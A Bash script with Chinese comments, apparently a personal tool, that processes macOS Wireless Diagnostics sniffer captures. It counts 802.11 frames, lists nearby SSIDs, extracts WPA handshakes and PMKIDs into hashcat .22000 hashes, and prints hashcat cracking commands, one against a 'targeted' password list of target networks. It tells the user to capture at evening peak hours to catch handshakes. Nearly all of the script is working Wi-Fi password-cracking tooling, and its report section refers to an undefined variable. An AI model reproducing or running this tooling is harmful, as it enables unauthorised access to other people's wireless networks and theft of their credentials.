#!/bin/bash
# ============================================================
# Wireless Diagnostics Sniffer 抓包分析工具
# 配合 macOS GUI Sniffer 使用（CLI路径不可用）
#
# 功能：
#   1. 自动检测 /var/tmp/ 下最新的 pcap 文件
#   2. 分析帧类型统计（beacon/probe/EAPOL）
#   3. 提取SSID列表，用WiFi名命名保存
#   4. hcxpcapngtool 转换为 hashcat .22000 格式
#   5. 清理临时文件，只保留最终结果
#
# 用法：
#   GUI操作: Wireless Diagnostics → Sniffer → 选频道 → 开始 → 等待 → 停止
#   然后运行: bash analyze_sniffer.sh
#   或指定文件: bash analyze_sniffer.sh /var/tmp/xxx.pcap
#
# 作者：传康Kk (微信:1837620622)
# ============================================================

set -uo pipefail

# 确保homebrew路径在PATH中
export PATH="/opt/homebrew/bin:/opt/homebrew/sbin:$PATH"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUTPUT_DIR="${SCRIPT_DIR}/抓包结果_$(date +%Y%m%d_%H%M%S)"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ============================================================
# 检查依赖
# ============================================================
check_deps() {
    local missing=()
    command -v tcpdump >/dev/null 2>&1 || missing+=("tcpdump")
    command -v hcxpcapngtool >/dev/null 2>&1 || missing+=("hcxpcapngtool (brew install hcxtools)")
    command -v mergecap >/dev/null 2>&1 || missing+=("mergecap (brew install wireshark)")
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] 缺少依赖:${NC}"
        for m in "${missing[@]}"; do echo "    - $m"; done
        exit 1
    fi
}

# ============================================================
# 查找pcap文件
# ============================================================
find_pcap() {
    local pcap_file="$1"
    if [ -n "$pcap_file" ] && [ -f "$pcap_file" ]; then
        echo "$pcap_file"
        return
    fi
    # 自动查找 /var/tmp/ 下最新的pcap
    local latest
    latest=$(ls -t /var/tmp/*.pcap 2>/dev/null | head -1)
    if [ -z "$latest" ]; then
        echo ""
        return
    fi
    echo "$latest"
}

# ============================================================
# 分析pcap文件
# ============================================================
analyze_pcap() {
    local pcap="$1"
    local size
    size=$(ls -lh "$pcap" | awk '{print $5}')

    echo -e "${CYAN}════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  pcap 分析: $(basename "$pcap")${NC}"
    echo -e "${CYAN}  大小: ${size}${NC}"
    echo -e "${CYAN}════════════════════════════════════════════${NC}"

    # 总帧数
    local total
    total=$(tcpdump -r "$pcap" 2>/dev/null | wc -l | tr -d ' ')
    echo -e "  总帧数: ${GREEN}${total}${NC}"

    if [ "$total" -eq 0 ]; then
        echo -e "${RED}  [!] 文件为空，没有抓到任何帧${NC}"
        return 1
    fi

    # 帧类型统计
    local beacons probes_req probes_resp auth assoc data eapol
    beacons=$(tcpdump -r "$pcap" 'type mgt subtype beacon' 2>/dev/null | wc -l | tr -d ' ')
    probes_req=$(tcpdump -r "$pcap" 'type mgt subtype probe-req' 2>/dev/null | wc -l | tr -d ' ')
    probes_resp=$(tcpdump -r "$pcap" 'type mgt subtype probe-resp' 2>/dev/null | wc -l | tr -d ' ')
    auth=$(tcpdump -r "$pcap" 'type mgt subtype auth' 2>/dev/null | wc -l | tr -d ' ')
    assoc=$(tcpdump -r "$pcap" 'type mgt subtype assoc-req' 2>/dev/null | wc -l | tr -d ' ')
    data=$(tcpdump -r "$pcap" 'type data' 2>/dev/null | wc -l | tr -d ' ')
    eapol=$(tcpdump -r "$pcap" 'ether proto 0x888e' 2>/dev/null | wc -l | tr -d ' ')

    echo ""
    echo "  帧类型分布:"
    echo "  ┌──────────────────┬────────┐"
    echo "  │ Beacon           │ $(printf '%6s' "$beacons") │"
    echo "  │ Probe Request    │ $(printf '%6s' "$probes_req") │"
    echo "  │ Probe Response   │ $(printf '%6s' "$probes_resp") │"
    echo "  │ Authentication   │ $(printf '%6s' "$auth") │"
    echo "  │ Association Req  │ $(printf '%6s' "$assoc") │"
    echo "  │ Data             │ $(printf '%6s' "$data") │"
    printf "  │ %-16s │ %6s │\n" "EAPOL(握手帧)" "$eapol"
    echo "  └──────────────────┴────────┘"

    # EAPOL是关键
    if [ "$eapol" -gt 0 ]; then
        echo -e "\n  ${GREEN}✓✓✓ 发现 ${eapol} 个EAPOL帧！有握手包！${NC}"
    else
        echo -e "\n  ${YELLOW}  EAPOL=0: 监听期间无客户端认证事件${NC}"
        echo -e "  ${YELLOW}  提示: 晚高峰(18-22点)重试，或换频道${NC}"
    fi

    # 提取可见的SSID列表
    echo ""
    echo "  可见的WiFi网络:"
    tcpdump -r "$pcap" 'type mgt subtype beacon' -e 2>/dev/null \
        | sed -n 's/.*Beacon (\([^)]*\)).*/\1/p' \
        | sort -u | while read -r ssid; do
            [ -n "$ssid" ] && echo "    · $ssid"
        done

    return 0
}

# ============================================================
# 转换并保存结果
# ============================================================
convert_and_save() {
    local pcap="$1"

    mkdir -p "$OUTPUT_DIR"

    # 提取频道信息用于文件命名
    local basename_pcap
    basename_pcap=$(basename "$pcap" .pcap)
    local channel="unknown"
    if echo "$basename_pcap" | grep -q '_ch'; then
        channel=$(echo "$basename_pcap" | sed 's/.*_ch\([0-9]*\).*/\1/')
    fi

    # 提取该pcap中信号最强的SSID（按出现频率排序，取前3个）
    local ssid_top3
    ssid_top3=$(tcpdump -r "$pcap" 'type mgt subtype beacon' -e 2>/dev/null \
        | sed -n 's/.*Beacon (\([^)]*\)).*/\1/p' \
        | grep -v '^$' | sort | uniq -c | sort -rn | head -3 \
        | awk '{print $2}' | tr '\n' '_' | sed 's/_$//')

    # 安全文件名（替换特殊字符，截断到40字符）
    local safe_name
    safe_name=$(echo "$ssid_top3" | tr '/' '-' | tr ' ' '_' | tr ':' '-' | head -c 40)
    [ -z "$safe_name" ] && safe_name="ch${channel}"

    # 复制原始pcap（用WiFi名命名）
    local dest_pcap="${OUTPUT_DIR}/${safe_name}_ch${channel}.pcap"
    cp "$pcap" "$dest_pcap"
    echo -e "\n  ${CYAN}已保存: $(basename "$dest_pcap")${NC}"

    # hcxpcapngtool转换
    local hashfile="${OUTPUT_DIR}/${safe_name}_ch${channel}.22000"
    echo -e "  ${CYAN}hcxpcapngtool 转换中...${NC}"
    local hcx_output
    hcx_output=$(hcxpcapngtool -o "$hashfile" "$pcap" 2>&1)

    # 提取关键信息显示
    echo "$hcx_output" | grep -E 'ESSID|BEACON|EAPOL|PMKID|handshake|written|hash' | head -10 | while read -r line; do
        echo "    $line"
    done

    if [ -s "$hashfile" ]; then
        local hash_count
        hash_count=$(wc -l < "$hashfile" | tr -d ' ')
        echo ""
        echo -e "  ${GREEN}╔══════════════════════════════════════════╗${NC}"
        echo -e "  ${GREEN}║  ✓ 提取到 ${hash_count} 条可破解哈希!              ║${NC}"
        echo -e "  ${GREEN}╚══════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  哈希文件: ${CYAN}${hashfile}${NC}"
        echo ""
        echo -e "  ${YELLOW}hashcat破解命令:${NC}"
        echo "  hashcat -m 22000 '${hashfile}' ../针对性密码本/dict_ALL_TARGETS.txt"
        echo "  hashcat -m 22000 -a 3 '${hashfile}' '?d?d?d?d?d?d?d?d'"
    else
        rm -f "$hashfile"
        echo -e "  ${YELLOW}未提取到可破解哈希（无EAPOL/PMKID）${NC}"
    fi

    # 写分析报告
    local report="${OUTPUT_DIR}/分析报告.txt"
    {
        echo "WiFi抓包分析报告"
        echo "生成时间: $(date)"
        echo "源文件: $pcap"
        echo "频道: CH${channel}"
        echo "可见WiFi: ${ssid_list}"
        echo ""
        echo "帧统计:"
        tcpdump -r "$pcap" 2>/dev/null | wc -l | tr -d ' '
        echo "EAPOL帧数:"
        tcpdump -r "$pcap" 'ether proto 0x888e' 2>/dev/null | wc -l | tr -d ' '
    } > "$report"

    echo -e "\n  ${CYAN}分析报告: $(basename "$report")${NC}"
}

# ============================================================
# 清理 /var/tmp/ 中的旧pcap（可选）
# ============================================================
cleanup_tmp() {
    local pcap_count
    pcap_count=$(ls /var/tmp/*.pcap 2>/dev/null | wc -l | tr -d ' ')
    if [ "$pcap_count" -gt 0 ]; then
        echo ""
        echo -e "${YELLOW}  /var/tmp/ 中有 ${pcap_count} 个pcap文件:${NC}"
        ls -lh /var/tmp/*.pcap 2>/dev/null | awk '{print "    " $5 "  " $9}'
        echo ""
        read -rp "  是否清理这些临时文件? (y/N): " ans || ans="n"
        if [ "$ans" = "y" ] || [ "$ans" = "Y" ]; then
            rm -f /var/tmp/*.pcap
            echo -e "  ${GREEN}已清理${NC}"
        else
            echo "  保留"
        fi
    fi
}

# ============================================================
# 主函数
# ============================================================
main() {
    echo ""
    echo -e "${GREEN}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}  ║   Wireless Diagnostics Sniffer 抓包分析工具     ║${NC}"
    echo -e "${GREEN}  ║                                                ║${NC}"
    echo -e "${GREEN}  ║   自动分析pcap → 提取哈希 → WiFi名命名保存    ║${NC}"
    echo -e "${GREEN}  ╚══════════════════════════════════════════════════╝${NC}"

    check_deps

    # 查找pcap文件
    local pcap
    pcap=$(find_pcap "${1:-}")
    if [ -z "$pcap" ]; then
        echo -e "\n${RED}  [!] 未找到pcap文件${NC}"
        echo ""
        echo "  使用方法:"
        echo "    1. 按住Option → 点WiFi图标 → 打开无线诊断"
        echo "    2. 菜单栏 → 窗口 → 嗅探器"
        echo "    3. 选频道(如5) → 宽度20MHz → 开始"
        echo "    4. 等待30秒~数分钟 → 停止"
        echo "    5. 运行: bash $(basename "$0")"
        echo ""
        echo "  或指定文件: bash $(basename "$0") /path/to/file.pcap"
        exit 1
    fi

    echo -e "\n  找到pcap: ${CYAN}${pcap}${NC}"

    # 分析
    if analyze_pcap "$pcap"; then
        # 转换并保存
        convert_and_save "$pcap"
    fi

    # 清理临时文件
    cleanup_tmp

    echo ""
    echo -e "${CYAN}  输出目录: ${OUTPUT_DIR}${NC}"
    echo -e "${GREEN}  完成!${NC}"
    echo ""
}

main "$@"
